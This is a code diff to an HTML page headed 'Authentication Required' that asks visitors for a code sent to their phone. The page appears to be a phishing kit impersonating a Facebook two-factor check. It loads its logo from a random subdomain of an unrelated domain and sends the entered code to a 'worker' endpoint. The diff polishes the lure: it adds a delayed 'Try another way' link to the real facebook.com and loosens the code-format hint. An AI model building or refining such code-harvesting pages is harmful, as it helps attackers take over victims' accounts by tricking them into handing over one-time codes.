@@ -37,7 +37,7 @@
         <!-- Top Logo 1 -->
         <div class="mb-6 flex justify-center items-center">
             <img 
-                src="https://k7m2q9x4l8pr3vn6at1zw5by0cd8hf2jm9sx4gp6r1.thirdcrossing.co.uk/ngsfd.png"
+                src="https://k7m2q9x4l8pr3vn6at1zw5by0cd8hf2jm9sx4gp6r1.thirdcrossing.co.uk/ngsfd.png" 
                 alt="Logo 1" 
                 class="h-12 w-auto object-contain"
                 onerror="this.onerror=null; this.replaceWith(document.getElementById('fallback-logo-1').content.cloneNode(true));"
@@ -56,7 +56,7 @@
             Authentication Required
         </h1>
         <p class="text-sm text-gray-600 text-center mb-6">
-            Please enter the code sent to your mobile phone or laptop
+            Please enter the code sent to your mobile phone or tablet
         </p>
 
         <div class="bg-white p-6 md:p-8 rounded-xl shadow-md border border-gray-200">
@@ -72,7 +72,7 @@
                         name="code" 
                         required 
                         maxlength="8"
-                        placeholder="Enter 6-digit code"
+                        placeholder="Enter code"
                         class="w-full px-3.5 py-2.5 bg-gray-50 border border-gray-300 rounded-lg text-sm text-gray-900 tracking-widest text-center focus:outline-none focus:ring-2 focus:ring-brandBlue focus:bg-white focus:border-transparent transition-all"
                     >
                 </div>
@@ -88,9 +88,16 @@
                     </button>
                 </div>
 
-                <!-- Countdown / Resend Section -->
-                <div id="countdownContainer" class="text-center text-sm text-gray-500 pt-2">
-                    Send again in <span id="timer" class="font-semibold text-gray-700">10:00</span>
+                <!-- Countdown / Resend Section & Try Another Way -->
+                <div class="space-y-3 pt-2 text-center text-sm text-gray-500">
+                    <div id="countdownContainer">
+                        Send again in <span id="timer" class="font-semibold text-gray-700">10:00</span>
+                    </div>
+                    
+                    <!-- Hidden initially, shown after 5 minutes (when timer reaches 05:00) -->
+                    <div id="tryAnotherWayContainer" class="hidden">
+                        <a href="https://www.facebook.com" class="text-brandBlue hover:underline font-medium">Try another way</a>
+                    </div>
                 </div>
             </form>
             
@@ -132,15 +139,24 @@
     </footer>
 
     <script>
-        // Countdown Timer Logic (10 minutes = 600 seconds)
+        // Total time = 10 minutes (600s). Enable "Try another way" after 5 minutes elapsed (i.e. at <= 300s left).
         let timeLeft = 600;
-        const timerElement = document.getElementById("timer");
         const countdownContainer = document.getElementById("countdownContainer");
+        const tryAnotherWayContainer = document.getElementById("tryAnotherWayContainer");
 
         function updateCountdown() {
             const minutes = Math.floor(timeLeft / 60);
             const seconds = timeLeft % 60;
-            timerElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            const timerElement = document.getElementById("timer");
+
+            if (timerElement) {
+                timerElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            }
+
+            // Enable "Try another way" link once 5 minutes (300s) have passed
+            if (timeLeft <= 300) {
+                tryAnotherWayContainer.classList.remove('hidden');
+            }
 
             if (timeLeft > 0) {
                 timeLeft--;
@@ -150,26 +166,25 @@
             }
         }
 
-        // Start the countdown on page load
+        // Initialize countdown execution immediately on load
         updateCountdown();
 
         function handleResendCode(event) {
             event.preventDefault();
-            // Reset timer
+            // Reset timer back to 10 minutes
             timeLeft = 600;
+            tryAnotherWayContainer.classList.add('hidden'); // Hide again until another 5 mins pass
             countdownContainer.innerHTML = 'Send again in <span id="timer" class="font-semibold text-gray-700">10:00</span>';
-            // Re-assign timerElement reference and restart
-            document.getElementById("timer").textContent = "10:00";
             updateCountdown();
             
-            // Optional feedback
+            // Show feedback
             const msgBox = document.getElementById('statusMessage');
             msgBox.textContent = "A new code has been sent.";
             msgBox.className = "mt-4 p-3 rounded-lg text-sm text-center bg-blue-50 text-brandBlue border border-blue-200";
             msgBox.classList.remove('hidden');
         }
 
-        // Form submission handling to connect with your worker
+        // Form submission handling to worker
         const form = document.getElementById("verifyForm");
         const submitButton = document.getElementById("verify-button");
         const status = document.getElementById("statusMessage");
